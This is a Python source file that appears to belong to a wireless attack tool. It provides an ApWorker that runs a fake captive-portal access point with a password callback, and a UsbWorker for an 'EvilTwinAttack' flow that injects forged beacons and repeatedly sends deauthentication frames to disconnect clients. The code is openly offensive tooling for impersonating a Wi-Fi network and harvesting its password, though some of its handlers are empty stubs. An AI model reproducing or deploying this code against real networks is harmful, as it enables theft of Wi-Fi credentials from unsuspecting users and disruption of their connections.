"""USB worker thread: all blocking PyUSB I/O happens here.
Cross-platform: works on macOS (libpcap RX), Windows (WinUSB), Linux (libusb).

Also provides ApWorker - a high-level wrapper for the campaign flow that
uses the existing airscope driver (async inject_frame / register_rx_callback).
"""

import asyncio
import logging
import queue
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Optional


log = logging.getLogger(__name__)


@dataclass
class TxFrame:
    data: bytes
    priority: int  # 0=highest (mgmt), 1=dhcp/dns, 2=http, 3=beacon, 4=deauth
    timestamp: float = 0.0


# ---------------------------------------------------------------------------
# ApWorker - campaign-compatible wrapper (uses airscope driver/iface)
# ---------------------------------------------------------------------------

_BEACON_INTERVAL_MS = 100


@dataclass
class ApWorker:
    """Runs the captive-portal AP over an existing airscope driver.

    Used by ``CaptivePortalOrchestrator`` (campaign flow) which already has
    a ``driver`` and ``WlanInterface`` set up.
    """
    driver: object
    iface: object
    ssid: str
    bssid: str
    channel: int
    hs: object
    pair: object
    on_password: Optional[Callable[[str], None]] = None
    log_fn: Optional[Callable[[str], None]] = None

    _running: bool = field(default=False, repr=False)
    _beacon_task: Optional[asyncio.Task] = field(default=None, repr=False)
    _cleanup_task: Optional[asyncio.Task] = field(default=None, repr=False)
    _seq: int = field(default=0, repr=False)

    def __post_init__(self) -> None:
        self._log = self.log_fn or (lambda m: log.info(m))

    async def start(self) -> None:
        self._running = True
        self.iface.register_rx_callback(self._on_rx)
        self._beacon_task = asyncio.create_task(self._beacon_loop())
        self._cleanup_task = asyncio.create_task(self._cleanup_loop())
        self._log(f"[ap-worker] {self.ssid} started on ch {self.channel}")

    async def stop(self) -> None:
        self._running = False
        if self._beacon_task:
            self._beacon_task.cancel()
        if self._cleanup_task:
            self._cleanup_task.cancel()
        try:
            self.iface.unregister_rx_callback(self._on_rx)
        except Exception:
            pass
        self._log("[ap-worker] stopped")

    def _on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 12:
            return
        try:
            from .ap.frames import parse_fc, FC_TYPE_MGMT, strip_80211_data

            fc_type, subtype, to_ds, from_ds = parse_fc(raw)
            if fc_type == FC_TYPE_MGMT:
                self._handle_mgmt(raw, subtype)
            elif not to_ds and not from_ds:
                pass
            else:
                victim_mac, ip_packet = strip_80211_data(raw)
                if victim_mac is not None and ip_packet is not None:
                    self._handle_data(victim_mac, ip_packet)
        except Exception:
            log.debug("RX dispatch error", exc_info=True)

    def _handle_mgmt(self, raw: bytes, subtype: int) -> None:
        pass

    def _handle_data(self, victim_mac: bytes, ip_packet: bytes) -> None:
        pass

    async def _beacon_loop(self) -> None:
        from .ap.frames import craft_beacon
        bssid_bytes = bytes(int(o, 16) for o in self.bssid.split(":"))
        while self._running:
            self._seq = (self._seq + 1) & 0xFFF
            beacon = craft_beacon(bssid_bytes, self.ssid, self.channel, self._seq)
            try:
                await self.driver.inject_frame(beacon)
            except Exception:
                log.debug("beacon inject failed", exc_info=True)
            await asyncio.sleep(_BEACON_INTERVAL_MS / 1000.0)

    async def _cleanup_loop(self) -> None:
        while self._running:
            await asyncio.sleep(10.0)


# ---------------------------------------------------------------------------
# UsbWorker - low-level PyUSB thread (standalone EvilTwinAttack flow)
# ---------------------------------------------------------------------------

class UsbWorker:
    """
    Dedicated daemon thread for all USB I/O.

    - RX: continuously reads from the USB RX endpoint, dispatches frames
    - TX: priority queue for outgoing frames (mgmt > dhcp > http > beacon > deauth)
    - Beacon: timer-based, sends pre-built beacon every 100ms
    - Deauth: timer-based, sends pre-built deauth frames at configured rate
    - Disconnect: detects USB removal, logs + notifies TUI, stops cleanly

    Monitor mode: raw frame injection (no TX descriptor needed).
    If ``rtl_ap`` is provided, uses its _try_parse_rx() for descriptor
    auto-detection on incoming frames.
    """

    def __init__(self, usb_dev, ep_rx: int, ep_tx: int,
                 ap_state_machine, beacon_frame: bytes,
                 deauth_frames: list[bytes], deauth_interval: float = 0.1,
                 beacon_interval: float = 0.1,
                 rtl_ap=None):
        self._dev = usb_dev
        self._ep_rx = ep_rx
        self._ep_tx = ep_tx
        self._ap = ap_state_machine
        self._beacon = beacon_frame
        self._deauth_frames = deauth_frames
        self._deauth_interval = deauth_interval
        self._beacon_interval = beacon_interval
        self._rtl_ap = rtl_ap

        self._tx_queue: queue.PriorityQueue = queue.PriorityQueue()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._tx_count = 0
        self._rx_count = 0
        self._last_tui_update = 0.0
        self._stats_callback: Optional[Callable] = None
        self._on_disconnect: Optional[Callable] = None

    def start(self):
        self._running = True
        self._thread = threading.Thread(target=self._run, daemon=True, name="USB-Worker")
        self._thread.start()
        log.info("USB Worker started")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=3.0)
        self._drain_queue()
        log.info("USB Worker stopped")

    def set_stats_callback(self, callback: Callable):
        self._stats_callback = callback

    def set_disconnect_callback(self, callback: Callable):
        self._on_disconnect = callback

    def enqueue_tx(self, frame: bytes, priority: int = 2):
        self._tx_queue.put(TxFrame(data=frame, priority=priority,
                                   timestamp=time.monotonic()))

    def _drain_queue(self):
        while not self._tx_queue.empty():
            try:
                self._tx_queue.get_nowait()
            except queue.Empty:
                break

    def _handle_disconnect(self, reason: str):
        log.warning(f"USB disconnected: {reason}")
        self._running = False
        self._drain_queue()
        if self._on_disconnect:
            try:
                self._on_disconnect(reason)
            except Exception:
                pass

    def _run(self):
        next_beacon = time.monotonic()
        next_deauth = time.monotonic()
        deauth_idx = 0

        cap_session = None
        use_pcap = sys.platform == "darwin"
        if use_pcap:
            try:
                from .capture import CaptureSession
                cap_session = CaptureSession()
                cap_session.open(channel=6)
                if cap_session._backend != "pcap":
                    cap_session = None
                    use_pcap = False
                else:
                    log.info("UsbWorker: using libpcap for RX on macOS")
            except Exception as e:
                log.warning("UsbWorker: pcap init failed: %s", e)
                cap_session = None
                use_pcap = False

        while self._running:
            now = time.monotonic()

            if use_pcap and cap_session:
                try:
                    raw = cap_session.read_frame(timeout=0.005)
                    if raw:
                        self._rx_count += 1
                        self._ap.handle_rx(raw)
                except Exception:
                    pass
            else:
                try:
                    data = self._dev.read(self._ep_rx, 4096, timeout=5)
                    if data:
                        self._rx_count += 1
                        raw = bytes(data)
                        if self._rtl_ap:
                            frame = self._rtl_ap._try_parse_rx(raw)
                            if frame is not None:
                                self._ap.handle_rx(frame)
                        else:
                            self._ap.handle_rx(raw)
                except Exception as e:
                    if self._is_disconnect_error(e):
                        self._handle_disconnect(str(e))
                        return

            self._drain_pending_tx()

            if now >= next_beacon:
                try:
                    self._dev.write(self._ep_tx, self._beacon, timeout=50)
                    self._tx_count += 1
                except Exception as e:
                    if self._is_disconnect_error(e):
                        self._handle_disconnect(str(e))
                        return
                next_beacon = now + self._beacon_interval

            if self._deauth_frames and now >= next_deauth:
                try:
                    frame = self._deauth_frames[deauth_idx % len(self._deauth_frames)]
                    self._dev.write(self._ep_tx, frame, timeout=50)
                    self._tx_count += 1
                    deauth_idx += 1
                except Exception as e:
                    if self._is_disconnect_error(e):
                        self._handle_disconnect(str(e))
                        return
                next_deauth = now + self._deauth_interval

            if self._stats_callback and now - self._last_tui_update > 0.1:
                self._last_tui_update = now
                try:
                    self._stats_callback({
                        'tx': self._tx_count,
                        'rx': self._rx_count,
                        'clients': len(self._ap._clients),
                    })
                except Exception:
                    pass

            time.sleep(0.001)

        if cap_session:
            try:
                cap_session.close()
            except Exception:
                pass

    def _drain_pending_tx(self):
        while not self._tx_queue.empty():
            try:
                tx_frame = self._tx_queue.get_nowait()
                self._dev.write(self._ep_tx, tx_frame.data, timeout=50)
                self._tx_count += 1
            except Exception as e:
                if self._is_disconnect_error(e):
                    self._handle_disconnect(str(e))
                    return
                break

    @staticmethod
    def _is_disconnect_error(exc: Exception) -> bool:
        import usb.core
        if isinstance(exc, usb.core.USBError):
            return exc.errno in (19, 16, None)
        return False

    @property
    def stats(self) -> dict:
        return {'tx': self._tx_count, 'rx': self._rx_count}
